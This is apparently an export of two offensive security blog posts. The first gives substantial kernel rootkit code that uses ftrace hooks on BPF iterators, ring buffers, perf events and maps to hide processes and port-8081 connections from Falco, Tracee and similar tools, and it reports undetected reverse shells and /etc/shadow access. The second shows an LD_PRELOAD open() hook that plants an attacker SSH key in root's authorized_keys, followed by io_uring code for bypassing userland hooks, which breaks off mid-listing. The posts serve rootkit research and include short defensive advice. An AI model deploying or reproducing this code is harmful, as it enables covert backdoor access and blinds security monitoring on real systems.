BPF iterators allow eBPF programs to efficiently walk kernel data structures. Security tools use iterators to enumerate processes, network connections, and other kernel objects.\nIterator Flow:\nKernel Data (tasks, sockets) -\u0026gt; bpf_iter_run_prog() -\u0026gt; eBPF iterator program -\u0026gt; bpf_seq_write() / bpf_seq_printf() -\u0026gt; Userspace reads via seq_file Key Functions:\nbpf_iter_run_prog(): Executes the eBPF iterator program for each kernel object bpf_seq_write(): Writes data to the seq_file buffer bpf_seq_printf(): Formatted output to seq_file buffer Security Tools Using Iterators:\nGhostScan uses task iterators to detect hidden processes Decloaker uses network iterators to find hidden connections Custom security tools use iterators for forensic analysis BPF Ringbuffers Ringbuffers are the modern replacement for perf buffers, providing efficient event streaming from kernel to userspace with better performance and ordering guarantees.\nRingbuffer Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; bpf_ringbuf_reserve() -\u0026gt; bpf_ringbuf_submit() or bpf_ringbuf_output() -\u0026gt; Userspace reads events Key Functions:\nbpf_ringbuf_reserve(): Allocates space in the ringbuffer bpf_ringbuf_submit(): Commits reserved data to the ringbuffer bpf_ringbuf_output(): One-shot write to ringbuffer Security Tools Using Event Delivery Mechanisms:\nFalco (modern eBPF probe): Uses BPF ring buffer (BPF_MAP_TYPE_RINGBUF) for kernel→userspace event delivery (driver/config dependent). Tracee: Uses perfbuffer/perf ring buffers as its primary kernel→userspace event delivery mechanism (and can vary by version/implementation). Tetragon: Uses kernel→userspace buffering mechanisms (e.g., ring buffer / perf-based buffers) depending on the component and version. Note: \u0026ldquo;Perf event arrays\u0026rdquo; and \u0026ldquo;BPF ring buffers\u0026rdquo; are different mechanisms - the former is per-CPU and older, while the latter is shared across CPUs and more efficient.\nPerf Events Perf events are the traditional mechanism for streaming kernel data to userspace. While older than ringbuffers, many tools still use them.\nPerf Event Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; perf_event_output() -\u0026gt; perf_trace_run_bpf_submit() -\u0026gt; Userspace reads perf buffer Key Functions:\nperf_event_output(): Writes event to perf buffer perf_trace_run_bpf_submit(): Submits tracepoint data to eBPF programs Security Tools Using Perf Events:\nLegacy Falco versions Custom monitoring tools Kernel tracing utilities BPF Maps BPF maps are kernel data structures that store state and allow communication between eBPF programs and userspace.\nMap Operations:\neBPF program or userspace -\u0026gt; bpf_map_lookup_elem() -\u0026gt; bpf_map_update_elem() -\u0026gt; bpf_map_delete_elem() -\u0026gt; Kernel map data structure Key Functions:\nbpf_map_lookup_elem(): Retrieve value from map bpf_map_update_elem(): Insert or update map entry bpf_map_delete_elem(): Remove map entry Security Use Cases:\nStoring process metadata Tracking network connections Maintaining allow/deny lists Sharing data between eBPF programs Bypassing eBPF Security: Technical Implementation Now that we understand how eBPF security works, let\u0026rsquo;s examine how to systematically blind it.\nHook Architecture Our approach uses ftrace to hook critical BPF functions. Ftrace allows dynamic tracing of kernel functions without modifying kernel code, making it perfect for interception.\nHooked Functions:\nstatic struct ftrace_hook hooks[] = { // BPF Iterator Hooks HOOK(\u0026#34;bpf_iter_run_prog\u0026#34;, hook_bpf_iter_run_prog, \u0026amp;orig_bpf_iter_run_prog), HOOK(\u0026#34;bpf_seq_write\u0026#34;, hook_bpf_seq_write, \u0026amp;orig_bpf_seq_write), HOOK(\u0026#34;bpf_seq_printf\u0026#34;, hook_bpf_seq_printf, \u0026amp;orig_bpf_seq_printf), // BPF Ringbuffer Hooks HOOK(\u0026#34;bpf_ringbuf_output\u0026#34;, hook_bpf_ringbuf_output, \u0026amp;orig_bpf_ringbuf_output), HOOK(\u0026#34;bpf_ringbuf_reserve\u0026#34;, hook_bpf_ringbuf_reserve, \u0026amp;orig_bpf_ringbuf_reserve), HOOK(\u0026#34;bpf_ringbuf_submit\u0026#34;, hook_bpf_ringbuf_submit, \u0026amp;orig_bpf_ringbuf_submit), // BPF Map Hooks HOOK(\u0026#34;bpf_map_lookup_elem\u0026#34;, hook_bpf_map_lookup_elem, \u0026amp;orig_bpf_map_lookup_elem), HOOK(\u0026#34;bpf_map_update_elem\u0026#34;, hook_bpf_map_update_elem, \u0026amp;orig_bpf_map_update_elem), // Perf Event Hooks HOOK(\u0026#34;perf_event_output\u0026#34;, hook_perf_event_output, \u0026amp;orig_perf_event_output), HOOK(\u0026#34;perf_trace_run_bpf_submit\u0026#34;, hook_perf_trace_run_bpf_submit, \u0026amp;orig_perf_trace_run_bpf_submit), // BPF Program Execution HOOK(\u0026#34;__bpf_prog_run\u0026#34;, hook_bpf_prog_run, \u0026amp;orig_bpf_prog_run), // BPF Syscall HOOK(\u0026#34;__x64_sys_bpf\u0026#34;, hook_bpf, \u0026amp;orig_bpf), HOOK(\u0026#34;__ia32_sys_bpf\u0026#34;, hook_bpf_ia32, \u0026amp;orig_bpf_ia32), }; Why This Works:\nKernel-level access: Once loaded, the rootkit runs at ring 0 with full privileges Ftrace hooking: Operates below eBPF programs, allowing us to filter their data sources No eBPF involvement: We\u0026rsquo;re not fighting eBPF, we\u0026rsquo;re cutting off its inputs Selective filtering: Only hide specific processes/connections, not everything Process and Network Hiding The rootkit maintains lists of hidden PIDs and network connections. Child process tracking ensures that when you hide a shell, all spawned processes also remain hidden.\nHidden PID Management:\n#define MAX_HIDDEN_PIDS 32 #define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128) extern int hidden_pids[MAX_HIDDEN_PIDS]; extern int hidden_count; extern int child_pids[MAX_CHILD_PIDS]; extern int child_count; notrace void add_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return; } if (hidden_count \u0026lt; MAX_HIDDEN_PIDS) { hidden_pids[hidden_count++] = pid; } } notrace int is_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return 1; } return 0; } Child Process Tracking:\nstatic notrace bool is_child_of_hidden_process(int pid) { struct task_struct *task; struct task_struct *parent; int depth = 0; int max_depth = 10; bool hidden = false; if (pid \u0026lt;= 0) return false; if (should_hide_pid_by_int(pid)) return true; rcu_read_lock(); task = pid_task(find_vpid(pid), PIDTYPE_PID); if (!task) { rcu_read_unlock(); return false; } parent = task; while (parent \u0026amp;\u0026amp; depth \u0026lt; max_depth) { if (parent-\u0026gt;pid \u0026lt;= 0) break; parent = rcu_dereference(parent-\u0026gt;real_parent); if (!parent || parent-\u0026gt;pid \u0026lt;= 1) break; if (should_hide_pid_by_int(parent-\u0026gt;pid)) { hidden = true; break; } depth++; } rcu_read_unlock(); return hidden; } Network Connection Hiding:\n#define HIDDEN_PORT 8081 static notrace bool should_hide_socket_port(struct sock_common *sk) { __be16 sport, dport; __be32 saddr, daddr; if (!sk) return false; init_hidden_ip(); if (sk-\u0026gt;skc_family == AF_INET) { sport = sk-\u0026gt;skc_num; dport = sk-\u0026gt;skc_dport; saddr = sk-\u0026gt;skc_rcv_saddr; daddr = sk-\u0026gt;skc_daddr; if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) { if (saddr == hidden_ip_cached || daddr == hidden_ip_cached || saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) { return true; } } } else if (sk-\u0026gt;skc_family == AF_INET6) { sport = sk-\u0026gt;skc_num; if (sport == HIDDEN_PORT) { return true; } } return false; } Intercepting BPF Iterators BPF iterators allow tools like GhostScan and Decloaker to enumerate kernel objects. By hooking the iterator execution, we can selectively filter results.\nIterator Context Structures:\nstruct bpf_iter_ctx_tcp { struct bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; }; struct bpf_iter_ctx_udp { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; }; struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; }; Hooking bpf_iter_run_prog:\nstatic notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx) { struct bpf_iter_ctx_tcp *tcp_ctx; struct bpf_iter_ctx_udp *udp_ctx; struct bpf_iter_ctx_task *task_ctx; struct sock_common *sk; struct udp_sock *udp_sk; struct task_struct *task; if (!orig_bpf_iter_run_prog || !ctx) goto passthrough; // Check if this is a TCP socket iterator tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx; if (tcp_ctx \u0026amp;\u0026amp; tcp_ctx-\u0026gt;sk_common) { sk = tcp_ctx-\u0026gt;sk_common; if ((unsigned long)sk \u0026gt; PAGE_SIZE) { if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a UDP socket iterator udp_ctx = (struct bpf_iter_ctx_udp *)ctx; if (udp_ctx \u0026amp;\u0026amp; udp_ctx-\u0026gt;udp_sk) { udp_sk = udp_ctx-\u0026gt;udp_sk; if ((unsigned long)udp_sk \u0026gt; PAGE_SIZE) { sk = \u0026amp;udp_sk-\u0026gt;inet.sk.__sk_common; if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a task iterator task_ctx = (struct bpf_iter_ctx_task *)ctx; if (task_ctx \u0026amp;\u0026amp; task_ctx-\u0026gt;task) { task = task_ctx-\u0026gt;task; if ((unsigned long)task \u0026gt; PAGE_SIZE \u0026amp;\u0026amp; task-\u0026gt;pid \u0026gt; 0) { if (is_child_of_hidden_process(task-\u0026gt;pid)) { return 0; // Skip this task } } } passthrough: return orig_bpf_iter_run_prog(prog, ctx); } How This Defeats Detection:\nWhen GhostScan or Decloaker use BPF iterators to enumerate processes or network connections, our hook intercepts each iteration. For hidden PIDs or network connections, we return 0 (skip), preventing the eBPF program from ever seeing that object. The security tool thinks it\u0026rsquo;s seeing the complete system state, but we\u0026rsquo;ve selectively filtered the view.\nHooking seq_file Output:\nIterators also use bpf_seq_write() and bpf_seq_printf() to format output. We hook these too:\nstatic notrace int hook_bpf_seq_write(struct seq_file *seq, const void *data, u32 len) { const u32 *pid_data; int i; if (!orig_bpf_seq_write) return -ENOSYS; if (!data || len \u0026lt; sizeof(u32)) goto passthrough; // Scan the data for PIDs pid_data = (const u32 *)data; for (i = 0; i \u0026lt; (len / sizeof(u32)) \u0026amp;\u0026amp; i \u0026lt; 16; i++) { u32 potential_pid = pid_data[i]; if (potential_pid \u0026gt; 0 \u0026amp;\u0026amp; potential_pid \u0026lt; 4194304) { if (is_child_of_hidden_process((int)potential_pid)) { return 0; // Block this write } } } passthrough: return orig_bpf_seq_write(seq, data, len); } Filtering Ringbuffer Events Falco and Tracee heavily rely on ringbuffers for event streaming. By hooking ringbuffer operations, we can prevent events related to our processes from reaching userspace.\nFalco Event Structure:\nstruct falco_event_hdr { u64 ts; u64 tid; u32 len; u16 type; u32 nparams; } __attribute__((packed)); static notrace bool is_falco_event(void *data, u64 size) { struct falco_event_hdr *hdr; if (!data || size \u0026lt; sizeof(struct falco_event_hdr)) return false; hdr = (struct falco_event_hdr *)data; // Validate event structure if (hdr-\u0026gt;type \u0026gt;= 1 \u0026amp;\u0026amp; hdr-\u0026gt;type \u0026lt;= 400 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026gt; 0 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026lt; 65536 \u0026amp;\u0026amp; hdr-\u0026gt;nparams \u0026lt; 20) { return true; } return false; } Hooking bpf_ringbuf_output:\nstatic notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_output) return -ENOSYS; if (!data || !ringbuf) goto passthrough; // Check if this looks like a Falco event if (!is_falco_event(data, size)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // If this event is from a hidden process, drop it if (is_child_of_hidden_process(pid)) { return 0; } passthrough: return orig_bpf_ringbuf_output(ringbuf, data, size, flags); } Hooking bpf_ringbuf_reserve:\nstatic notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags) { pid_t pid; if (!orig_bpf_ringbuf_reserve) return NULL; pid = current-\u0026gt;tgid; // Deny ringbuffer allocation for hidden processes if (is_child_of_hidden_process(pid)) { return NULL; } return orig_bpf_ringbuf_reserve(ringbuf, size, flags); } Hooking bpf_ringbuf_submit:\nstatic notrace void hook_bpf_ringbuf_submit(void *data, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_submit) return; if (!data) goto passthrough; if (!is_falco_event(data, 0)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // Drop submission for hidden processes if (is_child_of_hidden_process(pid)) { return; } passthrough: orig_bpf_ringbuf_submit(data, flags); } How This Defeats Detection:\nFalco and Tracee see syscall events, process creation, file access, and network activity through ringbuffers. By intercepting at three points (reserve, output, submit), we ensure that events from hidden processes never make it to the ringbuffer. From Falco\u0026rsquo;s perspective, these processes simply don\u0026rsquo;t exist.\nBlocking Perf Event Submission Older tools and some Falco configurations still use perf events instead of ringbuffers. We hook these too.\nHooking perf_event_output:\nstatic notrace int hook_perf_event_output(struct perf_event *event, struct perf_sample_data *data, struct pt_regs *regs) { pid_t pid; if (!orig_perf_event_output) return -ENOSYS; pid = current-\u0026gt;tgid; // Drop perf events for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_perf_event_output(event, data, regs); } Hooking perf_trace_run_bpf_submit:\nstatic notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size, int rctx, struct pt_regs *regs, struct hlist_head *head, struct task_struct *task) { if (!orig_perf_trace_run_bpf_submit) return; // Check if the task is hidden if (task \u0026amp;\u0026amp; is_child_of_hidden_process(task-\u0026gt;pid)) { return; } // Also check current process if (is_child_of_hidden_process(current-\u0026gt;tgid)) { return; } orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task); } Manipulating BPF Maps Security tools often use BPF maps to store process metadata, track suspicious activity, or maintain state. By hooking map operations, we can prevent our processes from being recorded.\nHooking bpf_map_lookup_elem:\nstatic notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key) { void *ret; pid_t pid; if (!orig_bpf_map_lookup_elem) return NULL; ret = orig_bpf_map_lookup_elem(map, key); // If the map uses PIDs as keys, filter hidden PIDs if (ret \u0026amp;\u0026amp; map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(pid_t)) { pid = *(pid_t *)key; if (is_child_of_hidden_process(pid)) { return NULL; // Pretend the entry doesn\u0026#39;t exist } } return ret; } Hooking bpf_map_update_elem:\nstatic notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key, void *value, u64 flags) { u32 *pid_key; if (!orig_bpf_map_update_elem) return -ENOSYS; // If this is a PID-keyed map, block updates for hidden PIDs if (map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(u32)) { pid_key = (u32 *)key; if (is_child_of_hidden_process((int)*pid_key)) { return 0; // Silently succeed without actually updating } } return orig_bpf_map_update_elem(map, key, value, flags); } How This Defeats Detection:\nSecurity tools that track process behavior using BPF maps will never see entries for our hidden processes. When they try to look up a hidden PID, the lookup returns NULL. When they try to store data about a hidden process, the update silently fails. The tool\u0026rsquo;s logic continues to work, but it operates on an incomplete view of reality.\nBlocking eBPF Program Execution For maximum stealth, we can also prevent eBPF programs from running when triggered by our hidden processes.\nHooking __bpf_prog_run:\nstatic notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx) { pid_t pid; if (!orig_bpf_prog_run) return 0; pid = current-\u0026gt;tgid; // Don\u0026#39;t execute eBPF programs for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_bpf_prog_run(prog, ctx); } Hooking the bpf() syscall:\nstatic notrace asmlinkage long hook_bpf(const struct pt_regs *regs) { int cmd; pid_t pid; if (!orig_bpf) return -ENOSYS; cmd = (int)regs-\u0026gt;di; pid = current-\u0026gt;tgid; // Hidden processes can use bpf() normally // but we could log/block specific commands here if (is_child_of_hidden_process(pid)) { // Optional: block certain BPF commands } return orig_bpf(regs); } Real-World Bypass Results Proof-of-Concept video demonstrating these results:\nFalco Evasion Falco is one of the most popular eBPF-based runtime security tools. It monitors syscalls, file access, network connections, and process execution to detect threats.\nWhat Falco Should Detect:\nReverse shell creation Suspicious network connections Critical file read And common post-exploitation activity (process exec/spawn, outbound connections, and sensitive file access).\nBypass Results:\nWith our BPF hooks active:\nReverse Shell: Connected to attacker-controlled server on port 8081. Falco detected nothing. Process Execution: Spawned interactive bash shell. Falco detected nothing. File Modification: Modified and read /etc/passwd, /etc/shadow. Falco detected nothing. Network Activity: Established multiple TCP connections. Falco detected nothing. Privilege Escalation: Used rootkit\u0026rsquo;s signal-based privilege escalation (kill -59). Falco detected nothing. Why The Bypass Works:\nFalco\u0026rsquo;s eBPF programs successfully attach to syscall tracepoints and execute as designed. However, every event they generate passes through kernel→userspace delivery (ring buffer / perf buffer, depending on driver/version), which we can disrupt via hooked kernel functions. Events from hidden processes are filtered before reaching Falco\u0026rsquo;s userspace agent. From Falco\u0026rsquo;s perspective, the system appears normal.\nTracee Evasion Tracee provides detailed system call tracing and event analysis. It\u0026rsquo;s designed to detect anomalous behavior and hidden processes.\nWhat Tracee Should Detect:\nHidden processes Kernel module loading Syscall anomalies And common attacker workflows (process hiding and suspicious network behavior).\nBypass Results:\nWith our BPF hooks active:\nProcess Enumeration: Tracee\u0026rsquo;s process listing showed no hidden processes Syscall Tracing: No syscalls from hidden processes appeared in traces Network Connections: Hidden network connections invisible to Tracee Why The Bypass Works:\nTracee relies on BPF iterators for process enumeration and ringbuffers for syscall events. Our hooks intercept both. The iterator hook ensures hidden processes never appear in enumeration. The ringbuffer hooks prevent syscall events from being recorded.\nAdditional Tools GhostScan:\nGhostScan attempts to detect hidden processes by comparing different enumeration methods. It uses BPF iterators to walk the task list.\nResult: Hidden processes remain invisible. Our iterator hooks ensure consistency across all enumeration methods.\nDecloaker:\nDecloaker tries to reveal hidden network connections by using multiple detection techniques including BPF iterators.\nResult: Hidden connections remain invisible. Our iterator and socket filtering hooks ensure network connections on our target port never appear.\nCustom eBPF Tools:\nSeveral custom security tool using BPF iterators, ringbuffers, or perf events for monitoring will be equally blind to our hidden processes.\nThe Hard Truth:\nIf an attacker gains the ability to load kernel modules, they control the kernel\u0026rsquo;s view of reality. eBPF security tools run inside the kernel and thus cannot fully protect a compromised kernel. The only reliable defense is preventing kernel compromise in the first place.\nConclusion This research demonstrates that eBPF-based security tools, while powerful, operate under a false assumption: that kernel-level observability provides complete visibility. In reality, when an attacker achieves kernel-level access through a loaded module, they can systematically blind these tools by hooking the very mechanisms they rely on.\nKey Findings:\nTarget the data path, not the program: If you can control the kernel-side plumbing that carries events to user space, the eBPF program can \u0026ldquo;run correctly\u0026rdquo; while its output never arrives.\nEnumerators are just another surface: Iterator-based tools depend on bpf_iter_run_prog() and seq_file writes. Filtering there can make multiple views of the system agree on a lie.\nEvent delivery is a choke point: Whether a tool uses ring buffer (BPF_MAP_TYPE_RINGBUF) or perf buffer (BPF_MAP_TYPE_PERF_EVENT_ARRAY), the kernel→userspace boundary creates a natural interception point.\nState can be selectively erased: Map lookups/updates are convenient places to make hidden PIDs appear “not found” without breaking the rest of the system.\nOnce the kernel is hostile, observability is best-effort: eBPF improves visibility under a trusted kernel. It does not harden a compromised kernel.\nWhat this PoC demonstrates:\nSuccessfully bypassed Falco, Tracee, GhostScan, and Decloaker Demonstrated complete process and network hiding from eBPF tools Proved that kernel-level access fundamentally breaks the security model Showed that observability itself can be made optional for an attacker Defensive Implications:\nSecurity cannot rely solely on kernel-level observability. Defense-in-depth requires:\nPreventing kernel compromise through Secure Boot and signed modules Multi-layer monitoring including network-level detection Hardware-rooted trust and attestation Accepting that a compromised kernel cannot secure itself The Future:\nThis cat-and-mouse game will continue. Security vendors will develop new detection methods. Attackers will find new bypass techniques :)\nBottom line: once the kernel is attacker-controlled, the system’s “ground truth” is no longer trustworthy. eBPF raises the bar under a trusted kernel, but it can’t be the last line of defense against a hostile one.\nThe real win is preventing kernel compromise in the first place (boot trust, module enforcement, and layered detection outside the host).\nResearch Resources:\nSingularity Rootkit: https://github.com/MatheuZSecurity/Singularity Rootkit Research Community: https://discord.gg/66N5ZQppU7 Contact: X (@MatheuzSecurity) | Discord (kprobe) Responsible Disclosure:\nThis research has been conducted for educational purposes. All techniques described are intended to improve defensive capabilities by understanding attacker methodologies. The code is published to help security researchers develop better detection and prevention mechanisms.\nIf you\u0026rsquo;re a security vendor affected by these techniques, please reach out for collaboration on improved detection strategies.\n","permalink":"http://localhost:1313/hacking/ebpf-security-tools-hacking/","summary":"\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMe: \u003ca href=\"https://www.linkedin.com/in/mathsalves/\"\u003ehttps://www.linkedin.com/in/mathsalves/\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eLinux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\u003c/p\u003e\n\u003cp\u003eBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\u003c/p\u003e\n\u003cp\u003eThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\u003c/p\u003e","title":"Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools"},{"content":" This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as open(), write(), and close(), which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\nWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the open() call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., io_uring_enter, io_uring_setup) for coordination.\nIntroduction to io_uring io_uring is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.\nKey Benefits of io_uring:\nLower syscall overhead Direct submission of I/O reduces the frequency and cost of context switches Kernel land execution reduces visibility to userland hooks This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.\nRootkits via LD_PRELOAD A common technique used in userland rootkits is to hook libc functions like open(), read(), and write() using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.\nExample: LD_PRELOAD Rootkit Explained This example demonstrates a userspace hook for the open() function to detect when a process tries to open /root/.ssh/authorized_keys, and instead injects an SSH key, enabling unauthorized access.\n// https://discord.gg/66N5ZQppU7 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; typedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; static int target(const char *pathname) { if (pathname == NULL) return 0; return strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0; } int open(const char *pathname, int flags, ...) { va_list args; mode_t mode = 0; if (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading orig open function: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } } if (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } if (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd \u0026lt; 0) { return fd; } const char *sshkey = \u0026#34;ssh-rsa ....snip kali@kali\\n\u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); return orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } if (flags \u0026amp; O_CREAT) { return orig_open(pathname, flags, mode); } else { return orig_open(pathname, flags); } } Detailed Behavior of the LD_PRELOAD Rootkit This rootkit relies on the LD_PRELOAD environment variable to hijack the open() function call from the standard C library. Here\u0026rsquo;s a breakdown of its logic and behavior:\ntypedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; A new function pointer type is defined for open(), allowing us to call the real open() after we hook it. orig_open will be initialized using dlsym() to point to the original function.\nTarget File Detection\nstatic int target(const char *pathname) { return pathname \u0026amp;\u0026amp; ( strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0 ); } The target() function checks if the file being accessed is the SSH authorized keys file. It performs a simple strcmp() against several known variants of the authorized_keys path.\nHooking the open() Function\nint open(const char *pathname, int flags, ...) { This is our hook. Because the name matches open() and LD_PRELOAD is set, all calls to open() will now invoke this custom implementation.\nif (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading original open: %s \u0026#34;, dlerror()); exit(EXIT_FAILURE); } } On the first call, we use dlsym(RTLD_NEXT, \u0026quot;open\u0026quot;) to resolve the real open() function from the next link in the shared object chain. This avoids recursion.\nif (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } If the O_CREAT flag is present, we extract the mode_t argument from the variadic list.\nif (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.\nconst char *sshkey = \u0026#34;ssh-rsa AAAAB3...snip... kali@kali \u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); A malicious SSH public key is written into the file, and the file is closed.\nreturn orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.\nreturn (flags \u0026amp; O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags); If the file is not one of the targets, the call is passed directly to the original open() function, maintaining transparency.\nSummary of Behavior:\nIntercepts calls to open() via LD_PRELOAD ilters paths that match authorized_keys Overwrites the file and injects a SSH public key Reopens the file with appropriate permissions to avoid suspicion Acts transparently for all other files, mimicking normal behavior This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.\nBypassing the Hook with io_uring Here, we use io_uringto bypass the hooked open() function by submitting kernel level I/O requests directly.\nFull Code with Explanations:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #include \u0026lt;liburing.h\u0026gt; #define FILE_PATH \u0026#34;/root/.ssh/authorized_keys\u0026#34; #define CONTENT \u0026#34;random\u0026#34; int main() { struct io_uring ring; int ret, fd; struct iovec iov; const char *content = CONTENT; size_t content_len = strlen(content); ret = io_uring_queue_init(1, \u0026amp;ring, 0); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_queue_init\u0026#34;); return 1; } struct io_uring_sqe *sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); return 1; } io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_sqe_set_data(sqe, (void *)1); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); return 1; } struct io_uring_cqe *cqe; ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); return 1; } fd = cqe-\u0026gt;res; io_uring_cqe_seen(\u0026amp;ring, cqe); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to open file: %d\\n\u0026#34;, fd); return 1; } sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); io_uring_sqe_set_data(sqe, (void *)2); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); 